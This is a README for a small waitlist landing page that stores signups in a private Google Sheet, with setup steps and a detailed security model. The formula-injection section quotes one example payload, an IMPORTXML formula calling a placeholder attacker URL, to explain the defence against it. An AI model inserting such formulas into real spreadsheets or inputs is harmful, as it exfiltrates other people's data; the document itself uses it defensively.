# Nookaa — Beverages & Beyond

Coming-soon landing page with a waitlist. Emails are appended to a **private
Google Sheet** via a service account, so the marketing team can filter and
export signups without anyone running a database.

The API surface is deliberately tiny: one endpoint that accepts an address and
says "thanks". Nothing reads addresses back out. Export happens in Google
Sheets, by a human who is signed in.

---

## Contents

1. [Quick start](#1-quick-start)
2. [Google Cloud setup](#2-google-cloud-setup)
3. [Configuration](#3-configuration)
4. [Running locally](#4-running-locally)
5. [Project structure](#5-project-structure)
6. [API](#6-api)
7. [Security model](#7-security-model)
8. [Deployment](#8-deployment)
9. [Troubleshooting](#9-troubleshooting)
10. [Exporting the list](#10-exporting-the-list)

---

## 1. Quick start

```bash
npm install
cp .env.example .env
npm run gen:secret        # paste the output into EMAIL_HASH_SECRET
npm test                  # 17 tests, no credentials needed
npm run dev               # http://localhost:3000
```

With no Google credentials the server still runs: signups go to a local
`data/waitlist.jsonl` spool (mode `600`) so you can develop and demo the form
before Sheets access is sorted out. The boot log tells you which store is live.

Requires **Node 18.17+**.

---

## 2. Google Cloud setup

### 2.1 Enable the API

1. Open the [Google Cloud Console](https://console.cloud.google.com/).
2. Create a project (or pick one) — ideally a **dedicated project** for this,
   so the service account can never be granted anything else by accident.
3. **APIs & Services → Library** → search "Google Sheets API" → **Enable**.

### 2.2 Create the service account

1. **IAM & Admin → Service Accounts → Create service account**.
2. Name it something obvious, e.g. `nookaa-waitlist`.
3. **Grant it no project roles.** It does not need any. Access to the one
   spreadsheet comes from sharing that sheet with it in the next step — that
   is the whole containment boundary.
4. Open the new account → **Keys → Add key → Create new key → JSON**.
5. A `.json` file downloads. This is a password. Do not commit it, do not
   email it, do not put it in a zip.

### 2.3 Create and share the sheet

1. Create a new Google Sheet. Rename the first tab to **`Waitlist`**.
2. Leave row 1 empty — the server writes the header
   (`Timestamp | Email | Source`) on first use.
3. **Share** → paste the service account address
   (`something@your-project.iam.gserviceaccount.com`) → role **Editor** → Send.
4. In the same dialog, set **General access → Restricted**. Link sharing must
   be off. This is the single most important setting in the whole project.
5. The sheet ID is the middle chunk of the URL:
   `https://docs.google.com/spreadsheets/d/`**`THIS_PART`**`/edit`

### 2.4 Feed the key to the app

Preferred — one opaque value, immune to newline mangling by host env editors:

```bash
npm run gen:credentials -- ./path/to/downloaded-key.json
# paste the output into GOOGLE_CREDENTIALS_BASE64
```

Then **delete the downloaded JSON file.** It has served its purpose.

Alternatively set `GOOGLE_SERVICE_ACCOUNT_EMAIL` and `GOOGLE_PRIVATE_KEY`
(keeping the literal `\n` escapes, wrapped in double quotes). Use one approach
or the other, not both.

---

## 3. Configuration

Every variable is documented inline in `.env.example`. The ones that decide
how exposed you are:

| Variable | Default | What it does |
|---|---|---|
| `EMAIL_HASH_SECRET` | — | Key for the in-memory duplicate index. **Required in production**; the server refuses to boot without it. `npm run gen:secret` |
| `REVEAL_DUPLICATES` | `false` | `true` makes a repeat signup return `Already Joined` — which also lets anyone test whether an address is on your list. See [§7](#7-security-model). |
| `PUBLIC_COUNT_ENABLED` | `false` | Exposes `GET /api/waitlist/count`, leaking list size. Off by default; the page falls back to its static "2,000+" copy. |
| `TRUST_PROXY_HOPS` | `0` | Number of reverse proxies actually in front of the app. Setting this higher than reality lets anyone forge `X-Forwarded-For` and bypass rate limiting. |
| `ALLOWED_ORIGINS` | *(blank)* | Blank = same-origin only, and **no** cross-origin browser can read the API. Only fill this in if the page is hosted separately. |
| `RESPONSE_FLOOR_MS` | `700` | Minimum duration of every signup response, so duplicates aren't measurably faster than new addresses. Don't set to `0` in production. |
| `RATE_LIMIT_MAX` | `5` | Signup attempts per IP per window. |
| `FALLBACK_STORE_ENABLED` | dev only | Local plaintext spool. A second copy of personal data, so it is off in production; there, a Sheets outage returns a clean `503`. |

The server **validates configuration at boot and exits non-zero** if
production is missing credentials or the hash secret. A broken deploy fails at
deploy time, not on a visitor's first submit.

---

## 4. Running locally

```bash
npm run dev     # node --watch, restarts on change
npm start       # plain start
npm test        # unit + security tests (no credentials required)
npm run check   # syntax-check the server entry points
```

Health probe: `curl localhost:3000/api/health` → `{"success":true,"ok":true}`
and nothing else. An anonymous caller should learn that the process is alive
and no more than that.

---

## 5. Project structure

```
public/                     the landing page, served statically
  index.html                unchanged from the original design
  style.css                 unchanged from the original design
  script.js                 submit logic only
  assets/                   5 images (3 unused ones were removed)

server/
  server.js                 Express app: headers, CORS, static, routes,
                            error handling, shutdown. No Google code.
  routes/
    waitlist.js             POST /api/waitlist, GET /api/waitlist/count
  services/
    googleSheets.js         the only file that talks to Google
  middleware/
    rateLimiter.js          per-IP signup limiter + global limiter
    validateEmail.js        validation, sanitisation, honeypot
  utils/
    config.js               every env var, parsed and validated once
    email.js                normalisation, RFC checks, formula neutralising
    emailHash.js            keyed fingerprint for the duplicate index
    logger.js               redacting logger
    httpError.js            safe errors, async wrapper, timing padding

test/
  security.test.js          17 tests over the security-critical logic
```

Dependency direction is one-way: `routes → services → utils`. Nothing in
`utils/` imports Express or googleapis, which is why the test suite runs
without `npm install`.

---

## 6. API

### `POST /api/waitlist`

```json
{ "email": "person@example.com", "source": "website" }
```

Pipeline: rate limit → validate → sanitise → duplicate check → store → JSON.

| Situation | Status | Body |
|---|---|---|
| Accepted (new **or** duplicate) | `200` | `{"success":true,"ok":true,"message":"Thanks! You're on the Nookaa waitlist…"}` |
| Empty address | `400` | `{"success":false,"message":"Please enter your email address."}` |
| Malformed address | `400` | `{"success":false,"message":"Invalid Email"}` |
| Too many attempts | `429` | `{"success":false,"message":"Too many attempts…"}` |
| Storage unavailable | `503` | `{"success":false,"message":"We could not save your email right now…"}` |

New and duplicate submissions are **byte-identical and equal in duration** by
design. With `REVEAL_DUPLICATES=true` a duplicate instead returns
`{"success":false,"message":"Already Joined"}`.

`ok` is a deprecated alias of `success`, kept so older clients don't break.

### `GET /api/waitlist/count`

`404` unless `PUBLIC_COUNT_ENABLED=true`. When on, returns a count rounded
**down to the nearest hundred** and cached for five minutes, so nobody can
watch the list grow one signup at a time.

### `GET /api/health`

`{"success":true,"ok":true}`. Nothing about environment, storage or uptime.

---

## 7. Security model

**What is actually protected, and by what.**

### Nothing sensitive reaches the browser

The client bundle contains no API key, no sheet ID, no service account, no
storage URL. There is nothing in the page source worth reading. The sheet ID
lives only in the server's environment and is scrubbed out of log lines and
error messages before they are written.

### No endpoint returns an address

There is no export route, no admin route, no list route. Nothing in the API
reads addresses back out. Export is a human action in Google Sheets.

### No enumeration oracle

This is the one that most waitlists get wrong. If a repeat signup answers
differently from a new one, the endpoint becomes a free lookup service: feed
it a list of addresses and it reports which of your customers are on the list.
Two defences, both on by default:

- **Identical responses** — same status, same body, for new and duplicate.
- **Identical timing** — every response is padded to `RESPONSE_FLOOR_MS`, so a
  duplicate (in-memory hit, no write) can't be distinguished from a new signup
  (one Sheets round-trip) by measuring it.

`REVEAL_DUPLICATES=true` trades this away for a friendlier message. Your call.

### The plaintext list is never held in memory

Duplicate detection works on keyed HMACs. Column B is read at most once a
minute, each address is fingerprinted immediately, and the plaintext is
dropped. A heap dump, a core file or a crash log yields no addresses. The HMAC
is keyed rather than a bare SHA-256 because the space of real email addresses
is small and patterned — an unkeyed digest is recoverable with a wordlist.

### Spreadsheet formula injection is blocked

Google Sheets treats a leading `=`, `+`, `-`, `@` or tab as a formula. A cell
containing `=IMPORTXML("http://attacker", "//x")` exfiltrates the sheet the
moment a colleague opens it. Every value written is prefixed with `'` if it
starts with one of those characters, on top of `valueInputOption: 'RAW'`.

### Logs cannot leak the list

IPs become a per-process rotating fingerprint. Addresses are logged as
`<fingerprint>@domain` — enough to spot a bot hammering one provider, useless
for contacting anyone. Sheet IDs, PEM keys and service account addresses are
stripped from every log line and error message.

### Transport and headers

Strict CSP with **no `unsafe-inline` anywhere** (the page has no inline styles
or scripts, so this was free), `default-src 'none'`, `frame-ancestors 'none'`,
`form-action 'none'`, HSTS with preload in production, `Referrer-Policy:
no-referrer`, `X-Content-Type-Options: nosniff`, a restrictive
`Permissions-Policy`, and `x-powered-by` disabled.

### Abuse resistance

5 signup attempts per IP per 15 minutes (failed ones count, so garbage input
buys no extra tries), a coarse global limiter, a 4 KB body cap, slowloris
timeouts on headers and requests, and a honeypot field that returns a normal
success so a bot never learns it was filtered.

### Minimal collection

Three columns: `Timestamp`, `Email`, `Source`. The previous build also stored
User-Agent and Referrer, which were never used. Data you don't hold can't leak.

### What this does *not* protect against

Being straight with you about the limits:

- **Addresses sit in plaintext in the Sheet.** That is inherent to wanting to
  export them from Sheets. Anyone with access to that Google account, or to
  the service account key, reads the whole list. Encryption at rest would
  break the export requirement.
- **Your sharing settings are the real perimeter.** Link-sharing on the sheet
  must be *Restricted*. No application-layer work compensates for a sheet
  that's readable by anyone with the link.
- **A leaked service account key is game over.** Rotate immediately if a key
  is ever committed, zipped, pasted into a ticket, or emailed.
- **Rate limiting is per-IP.** A distributed botnet with one address per IP
  can still submit. The honeypot and the limiter raise the cost; they don't
  make it impossible.

---

## 8. Deployment

Works on any Node host — Render, Railway, Fly, a plain VPS behind nginx.

**Checklist:**

1. `NODE_ENV=production`
2. `EMAIL_HASH_SECRET` set (32+ random chars). The app refuses to boot without it.
3. `GOOGLE_SHEET_ID` + `GOOGLE_CREDENTIALS_BASE64` set as **environment
   variables in the host's dashboard**, never in a committed file.
4. `TRUST_PROXY_HOPS` set to the real number of proxies — `1` for
   Render/Railway/Fly/single nginx, `0` for a plain VPS with no proxy.
5. `FORCE_HTTPS` defaults on in production. Leave it on.
6. Leave `ALLOWED_ORIGINS` blank unless the page is hosted separately.
7. Start command: `npm start`
8. Watch the boot log for `Storage: Google Sheet "<name>"`. If it says
   anything else, fix it before announcing the page.

The `data/` directory and every `.env*` file (except `.env.example`) are
gitignored. Verify with `git status --ignored` before your first push.

---

## 9. Troubleshooting

**`Refusing to start — configuration problems`**
Exactly what it says; the specific missing variables are listed underneath.
This is the app protecting you from a half-configured production deploy.

**`Google rejected the service account`** (401/403)
Either the key is wrong, or — far more often — **the sheet was never shared
with the service account**. Open the sheet, Share, paste the
`…iam.gserviceaccount.com` address, role Editor.

**`Spreadsheet or tab not found`** (404)
`GOOGLE_SHEET_ID` should be only the ID from the URL, not the whole URL.
Check `GOOGLE_SHEET_NAME` matches the **tab** name at the bottom of the sheet
(default `Waitlist`, case-sensitive).

**`error:0909006C:PEM routines:get_name:no start line`**
The private key lost its newlines. Use `GOOGLE_CREDENTIALS_BASE64` instead —
it exists precisely to avoid this.

**Signups return 429 immediately**
`TRUST_PROXY_HOPS` is probably wrong. If it's `0` behind a proxy, every
visitor shares the proxy's IP and they all hit one bucket.

**The form works but the sheet stays empty**
The boot log will say `Storage: local file`. Google credentials aren't being
read — check the variables are actually set in the running environment.

**The early-bird counter never updates**
Expected. `PUBLIC_COUNT_ENABLED` is `false` by default, the fetch fails
silently, and the static copy in the markup stays as authored.

**`npm test` fails with `Cannot find module`**
The test suite needs no dependencies. If this happens, something in `utils/`
has grown an import it shouldn't have.

---

## 10. Exporting the list

Open the sheet and **File → Download → CSV**. That is the whole procedure, and
it is intentional: export requires a signed-in human with explicit access to
that document. There is no API route that returns addresses, so there is no
route to leak, misconfigure, or leave unauthenticated.

Before sharing an export, remember it is a plaintext list of personal data —
it needs the same care as the sheet itself.

---

## Licence

UNLICENSED — private project.
